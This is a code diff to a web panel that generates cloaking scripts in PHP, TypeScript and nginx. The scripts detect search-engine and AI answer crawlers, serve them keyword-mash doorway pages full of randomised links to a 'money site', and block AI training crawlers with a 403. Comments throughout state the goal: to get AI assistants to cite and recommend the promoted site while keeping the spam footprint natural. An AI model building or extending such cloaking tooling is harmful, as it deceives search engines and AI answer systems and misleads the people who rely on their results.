@@ -63,8 +63,12 @@ export default function IndexerSettingsPage() {
 define('API_URL', '${publicUrl.replace(/\/$/, "")}/api/indexer/webhook');
 define('API_KEY', '${selectedDomain?.apiKey || "YOUR_DOMAIN_API_KEY_HERE"}');
 define('REDIRECT_TARGET', '${selectedDomain?.moneyUrl || "https://your-money-site.com"}');
-define('ALLOWED_BOTS', '${selectedDomain?.allowedBots || "google,bing,yandex,mailru"}');
+define('ALLOWED_BOTS', '${selectedDomain?.allowedBots || "google,bing,yandex,mailru,ai"}');
 define('STRICT_VERIFICATION', true); // Verify bots via Reverse & Forward DNS lookup to filter out fake User-Agents
+// GEO / AI search: "answer" bots fetch pages live and CITE them in AI answers -> real traffic.
+// "training" bots only ingest content to train future models -> no direct traffic, brand only.
+// Off by default: training-only crawlers get a 403 (no doorway, no money-site leak).
+define('SERVE_AI_TRAINING', false);
 
 // ─── BOT DETECTION LOGIC ───
 function get_client_ip() {
@@ -86,6 +90,14 @@ $is_bot = false;
 $detected_bot_type = '';
 $ua_lower = strtolower($user_agent);
 
+// AI / GEO crawlers. Split into "answer" (live citation -> traffic) and "training" (model ingest).
+$ai_answer_bots   = array('oai-searchbot', 'chatgpt-user', 'perplexitybot', 'perplexity-user', 'claudebot', 'claude-user', 'duckassistbot', 'google-extended');
+$ai_training_bots = array('gptbot', 'ccbot', 'anthropic-ai', 'bytespider', 'meta-externalagent', 'meta-externalfetcher', 'applebot-extended', 'cohere-ai', 'cohere-training', 'amazonbot', 'diffbot', 'imagesift', 'omgili', 'timpibot', 'youbot');
+function ua_matches_any($ua, $list) {
+    foreach ($list as $needle) { if (strpos($ua, $needle) !== false) return true; }
+    return false;
+}
+
 if (strpos($ua_lower, 'googlebot') !== false || strpos($ua_lower, 'google-inspectiontool') !== false || strpos($ua_lower, 'googleother') !== false || strpos($ua_lower, 'google-co') !== false || strpos($ua_lower, 'storebot-google') !== false || strpos($ua_lower, 'google-site-verification') !== false) {
     $is_bot = true;
     $detected_bot_type = 'google';
@@ -98,9 +110,24 @@ if (strpos($ua_lower, 'googlebot') !== false || strpos($ua_lower, 'google-inspec
 } elseif (strpos($ua_lower, 'mail.ru') !== false || strpos($ua_lower, 'mailru') !== false) {
     $is_bot = true;
     $detected_bot_type = 'mailru';
+} elseif (ua_matches_any($ua_lower, $ai_answer_bots)) {
+    // AI answer/search crawler — always served (this is the GEO traffic source)
+    $is_bot = true;
+    $detected_bot_type = 'ai';
+} elseif (ua_matches_any($ua_lower, $ai_training_bots)) {
+    // AI training crawler — served only if SERVE_AI_TRAINING is on, else blocked with 403
+    $detected_bot_type = 'ai';
+    if (SERVE_AI_TRAINING) { $is_bot = true; } else { $block_ai_training = true; }
 } elseif (strpos($ua_lower, 'bot') !== false || strpos($ua_lower, 'crawler') !== false || strpos($ua_lower, 'spider') !== false) {
     $is_bot = true;
     $detected_bot_type = 'other';
+}
+
+// Block AI training crawlers when disabled: no doorway, no redirect to the money site
+if (!empty($block_ai_training)) {
+    send_log_ping(false, 403);
+    header("HTTP/1.1 403 Forbidden");
+    exit;
 }
 
 // Perform double DNS lookup (rDNS + Forward IP match) to verify search engines
@@ -138,6 +165,19 @@ if ($is_bot) {
         echo htmlspecialchars($niche_words[array_rand($niche_words)]) . " ";
     }
     echo "</div>";
+
+    // Money-site promotion — surface REDIRECT_TARGET so search + AI crawlers discover,
+    // index and (for GEO) cite/recommend it. Varied anchors keep the footprint natural.
+    $money = REDIRECT_TARGET;
+    $money_host = preg_replace('#^https?://#', '', rtrim($money, '/'));
+    $anchors = array("official site", "read more", "best offer", "visit resource", "full guide", "recommended", "learn more", "see details");
+    echo "<p>Recommended resource: <a href='" . htmlspecialchars($money) . "'>" . htmlspecialchars($money_host) . "</a></p>";
+    echo "<ul>";
+    for ($i = 0; $i < 3; $i++) {
+        $anchor = ucfirst($anchors[array_rand($anchors)]) . " " . $niche_words[array_rand($niche_words)];
+        echo "<li><a href='" . htmlspecialchars($money) . "'>" . htmlspecialchars($anchor) . "</a></li>";
+    }
+    echo "</ul>";
 
     // Random crosslinks to next subdomains
     echo "<br/><br/><a href='?p=" . rand(100, 9999) . "'>Next internal link &rarr;</a>";
@@ -222,8 +262,10 @@ function send_log_ping($is_redirect, $status_code = 200) {
 
 define('API_URL', '${publicUrl.replace(/\/$/, "")}/api/indexer/webhook');
 define('API_KEY', '${selectedDomain?.apiKey || "YOUR_DOMAIN_API_KEY_HERE"}');
-define('ALLOWED_BOTS', '${selectedDomain?.allowedBots || "google,bing,yandex,mailru"}');
+define('REDIRECT_TARGET', '${selectedDomain?.moneyUrl || "https://your-money-site.com"}'); // money site linked to bots
+define('ALLOWED_BOTS', '${selectedDomain?.allowedBots || "google,bing,yandex,mailru,ai"}');
 define('STRICT_VERIFICATION', true);
+define('SERVE_AI_TRAINING', false); // false = block AI training-only crawlers (GPTBot, CCBot…) with 403
 
 // ─── BOT DETECTION LOGIC ───
 $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
@@ -235,6 +277,14 @@ $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
 $is_bot = false;
 $detected_bot_type = '';
 $ua_lower = strtolower($user_agent);
+
+// AI / GEO crawlers. Split into "answer" (live citation -> traffic) and "training" (model ingest).
+$ai_answer_bots   = array('oai-searchbot', 'chatgpt-user', 'perplexitybot', 'perplexity-user', 'claudebot', 'claude-user', 'duckassistbot', 'google-extended');
+$ai_training_bots = array('gptbot', 'ccbot', 'anthropic-ai', 'bytespider', 'meta-externalagent', 'meta-externalfetcher', 'applebot-extended', 'cohere-ai', 'cohere-training', 'amazonbot', 'diffbot', 'imagesift', 'omgili', 'timpibot', 'youbot');
+function ua_matches_any($ua, $list) {
+    foreach ($list as $needle) { if (strpos($ua, $needle) !== false) return true; }
+    return false;
+}
 
 if (strpos($ua_lower, 'googlebot') !== false || strpos($ua_lower, 'google-co') !== false) {
     $is_bot = true;
@@ -248,9 +298,22 @@ if (strpos($ua_lower, 'googlebot') !== false || strpos($ua_lower, 'google-co') !
 } elseif (strpos($ua_lower, 'mail.ru') !== false || strpos($ua_lower, 'mailru') !== false) {
     $is_bot = true;
     $detected_bot_type = 'mailru';
+} elseif (ua_matches_any($ua_lower, $ai_answer_bots)) {
+    $is_bot = true;
+    $detected_bot_type = 'ai';
+} elseif (ua_matches_any($ua_lower, $ai_training_bots)) {
+    $detected_bot_type = 'ai';
+    if (SERVE_AI_TRAINING) { $is_bot = true; } else { $block_ai_training = true; }
 } elseif (strpos($ua_lower, 'bot') !== false || strpos($ua_lower, 'crawler') !== false || strpos($ua_lower, 'spider') !== false) {
     $is_bot = true;
     $detected_bot_type = 'other';
+}
+
+// Block AI training crawlers when disabled
+if (!empty($block_ai_training)) {
+    send_log_ping(false, 403);
+    header("HTTP/1.1 403 Forbidden");
+    exit;
 }
 
 if ($is_bot && STRICT_VERIFICATION && in_array($detected_bot_type, array('google', 'yandex', 'bing', 'mailru'))) {
@@ -282,6 +345,18 @@ if ($is_bot) {
         echo htmlspecialchars($niche_words[array_rand($niche_words)]) . " ";
     }
     echo "</div>";
+
+    // Money-site promotion for search + AI (GEO) crawlers
+    $money = REDIRECT_TARGET;
+    $money_host = preg_replace('#^https?://#', '', rtrim($money, '/'));
+    $anchors = array("official site", "read more", "best offer", "visit resource", "full guide", "recommended", "learn more", "see details");
+    echo "<p>Recommended resource: <a href='" . htmlspecialchars($money) . "'>" . htmlspecialchars($money_host) . "</a></p>";
+    echo "<ul>";
+    for ($i = 0; $i < 3; $i++) {
+        $anchor = ucfirst($anchors[array_rand($anchors)]) . " " . $niche_words[array_rand($niche_words)];
+        echo "<li><a href='" . htmlspecialchars($money) . "'>" . htmlspecialchars($anchor) . "</a></li>";
+    }
+    echo "</ul>";
 
     echo "<br/><br/><a href='?p=" . rand(100, 9999) . "'>Next internal link &rarr;</a>";
     echo "</body></html>";
@@ -350,8 +425,12 @@ import dns from "dns/promises";
 const API_URL = "${publicUrl.replace(/\/$/, "")}/api/indexer/webhook";
 const API_KEY = "${selectedDomain?.apiKey || "YOUR_DOMAIN_API_KEY_HERE"}";
 const REDIRECT_TARGET = "${selectedDomain?.moneyUrl || "https://your-money-site.com"}";
-const ALLOWED_BOTS = "${selectedDomain?.allowedBots || "google,bing,yandex,mailru"}";
+const ALLOWED_BOTS = "${selectedDomain?.allowedBots || "google,bing,yandex,mailru,ai"}";
 const STRICT_VERIFICATION = true;
+const SERVE_AI_TRAINING = false; // false = block AI training-only crawlers (GPTBot, CCBot…) with 403
+// AI / GEO crawlers: "answer" bots cite live pages (traffic), "training" bots only ingest content.
+const AI_ANSWER_BOTS = ["oai-searchbot", "chatgpt-user", "perplexitybot", "perplexity-user", "claudebot", "claude-user", "duckassistbot", "google-extended"];
+const AI_TRAINING_BOTS = ["gptbot", "ccbot", "anthropic-ai", "bytespider", "meta-externalagent", "meta-externalfetcher", "applebot-extended", "cohere-ai", "cohere-training", "amazonbot", "diffbot", "imagesift", "omgili", "timpibot", "youbot"];
 
 async function verifyBotDns(ip: string, botType: string): Promise<boolean> {
   try {
@@ -415,6 +494,18 @@ export const onRequest = defineMiddleware(async (context, next) => {
   } else if (uaLower.includes("mail.ru") || uaLower.includes("mailru")) {
     isBot = true;
     detectedBotType = "mailru";
+  } else if (AI_ANSWER_BOTS.some(b => uaLower.includes(b))) {
+    isBot = true;
+    detectedBotType = "ai";
+  } else if (AI_TRAINING_BOTS.some(b => uaLower.includes(b))) {
+    detectedBotType = "ai";
+    if (SERVE_AI_TRAINING) {
+      isBot = true;
+    } else {
+      // Block AI training crawlers: no doorway, no money-site redirect
+      await sendLogPing({ apiKey: API_KEY, url: context.request.url, ip, userAgent, statusCode: 403, referer, isRedirect: false });
+      return new Response("Forbidden", { status: 403 });
+    }
   } else if (uaLower.includes("bot") || uaLower.includes("crawler") || uaLower.includes("spider")) {
     isBot = true;
     detectedBotType = "other";
@@ -455,10 +546,21 @@ export const onRequest = defineMiddleware(async (context, next) => {
       textMash += nicheWords[Math.floor(Math.random() * nicheWords.length)] + " ";
     }
 
+    // Money-site promotion for search + AI (GEO) crawlers
+    const moneyHost = REDIRECT_TARGET.replace(/^https?:\\/\\//, "").replace(/\\/$/, "");
+    const anchorWords = ["official site", "read more", "best offer", "visit resource", "full guide", "recommended", "learn more", "see details"];
+    let moneyLinks = "";
+    for (let i = 0; i < 3; i++) {
+      const a = anchorWords[Math.floor(Math.random() * anchorWords.length)] + " " + nicheWords[Math.floor(Math.random() * nicheWords.length)];
+      moneyLinks += \`<li><a href="\${REDIRECT_TARGET}">\${a}</a></li>\`;
+    }
+
     const html = \`<!DOCTYPE html><html><head><title>\${randTitle}</title></head><body style="font-family: sans-serif; padding: 20px;">
 <h1>\${randTitle}</h1>
 <p>Crawl pool semantic markup sandbox:</p>
 <div>\${textMash}</div>
+<p>Recommended resource: <a href="\${REDIRECT_TARGET}">\${moneyHost}</a></p>
+<ul>\${moneyLinks}</ul>
 <br/><br/><a href="?p=\${Math.floor(Math.random() * 9900) + 100}">Next internal link &rarr;</a>
 </body></html>\`;
 
@@ -480,13 +582,22 @@ export const onRequest = defineMiddleware(async (context, next) => {
 # Detects search crawlers and routes them to index.php (PHP handler),
 # while serving static files directly to humans.
 
-# Detect search bots
+# Detect search + AI (GEO) bots
 map $http_user_agent $is_bot {
     default 0;
     "~*googlebot" 1;
     "~*bingbot" 1;
     "~*yandex" 1;
     "~*mail.ru" 1;
+    # AI answer/search crawlers (drive GEO traffic) — the "good" bots
+    "~*oai-searchbot" 1;
+    "~*chatgpt-user" 1;
+    "~*perplexity" 1;
+    "~*claudebot" 1;
+    "~*claude-user" 1;
+    "~*google-extended" 1;
+    # AI training-only crawlers (GPTBot, CCBot, Bytespider, Meta, Applebot-Extended…) are
+    # intentionally NOT listed — they get the static/human path, not the doorway.
 }
 
 server {
